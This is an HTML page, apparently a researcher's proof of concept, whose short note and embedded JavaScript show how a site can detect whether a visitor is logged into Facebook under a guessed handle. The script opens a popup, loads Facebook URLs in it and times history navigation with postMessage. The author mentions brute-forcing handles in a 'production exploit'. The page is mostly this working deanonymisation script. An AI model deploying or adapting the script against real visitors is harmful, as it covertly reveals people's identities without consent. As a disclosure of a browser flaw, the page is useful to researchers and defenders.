<html><body>
This is only PoC. Type smth like oijfowijefohwqe and your real handle on Facebook e.g. http://facebook.com/<b>egor.homakov</b> and see how detector work. It's pretty slow (<b>20 seconds</b> to be sure) history object is changed as soon as full page has been loaded. <br>
<br>
In production exploit I could invent something for fast brute, but PoC is interesting on itself. And, yeah, you don't need to allow Popups in Chrome - because Popup in Chrome are opened in fact and work in background. <b>Just wait...</b>
<br>
<br>
P.S. Make sure to reload page after each try. I didn't debug it, PoC is very simple. <b>tested only in chrome</b> And if you don't use chrome it is your personal problem.
<script>
window.onmessage=function(e){
  if(await){
    clearTimeout(fail);
    x.close();
    alert("Yes, you are "+handle);
  }else{
    await = true;
  }
}
handle = prompt('Lets check if you are...(e.g. egor.homakov):')

await = false;
//opener.postMessage("","*")
x=window.open('data:text/html,<script>opener.postMessage("","*")<'+'/script>'); 
setTimeout(function(){
  x.location=('http://www.facebook.com/profile.php#')
  setTimeout(function(){
    x.location=('http://www.facebook.com/'+handle+'#')
    setTimeout(function(){
      fail = setTimeout(function(){
        alert('No, its not you. Reload the page and try again')
      }, 500);
      x.history.back()
    },10000)
  },10000)
},200)
</script></body></html>